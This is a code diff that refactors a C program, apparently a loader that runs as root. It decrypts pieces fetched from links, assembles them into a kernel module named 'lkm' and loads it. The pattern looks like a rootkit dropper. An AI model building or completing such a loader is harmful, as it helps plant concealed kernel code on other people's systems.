@@ -37,11 +37,7 @@ int main(void) {
   http_res_t http_post_res = {0};
   char **fraction_links = NULL;
   fraction_t *fractions = NULL;
-  unsigned char *module = NULL;
-  ssize_t total_size;
-  ssize_t module_size = 0;
-  decrypted *decrstr = NULL;
-
+  decrypted *module;
 
   if(geteuid() != 0){
     fprintf(stderr,"This program needs to be run as root!\n");
@@ -109,46 +105,7 @@ int main(void) {
 
   for (int i=0; i<lines_read; i++) {print_fraction(fractions[i]);}
 
-  for (int i = 0; i < num_links; i++) {
-
-    decrstr = decrypt_fraction( & fractions[i]);
-
-    if (decrstr -> decryptedtext == NULL) {
-      log_error("Decryption process failed");
-      continue;
-    }
-
-    if (module == NULL) {
-      total_size = decrstr -> text_size;
-      module = malloc(total_size);
-      if (module == NULL) {
-        log_error("Error in memory assigning");
-        break;
-      }
-    } else if (module_size + decrstr -> text_size > total_size) {
-      total_size += decrstr -> text_size;
-      unsigned char * tmp = realloc(module, total_size);
-      if (tmp == NULL) {
-        log_error("Memory reallocation failed");
-        break;
-      }
-      module = tmp;
-    }
-    memcpy(module + module_size, decrstr -> decryptedtext, decrstr -> text_size);
-    module_size += decrstr -> text_size;
-  }
-
-
-  int result = is_lkm_loaded("lkm");
-  if(result == 1){
-     remove_lkm();
-     puts("Reloading module:");
-     load_lkm(module, total_size);
-  } else if(result == 0){
-    load_lkm(module, total_size);
-  } else{
-    log_error("There was an error loading the LKM");
-  }
+  module = create_module(num_links,fractions);
 
   free(module);
   http_free(&http_post_res);
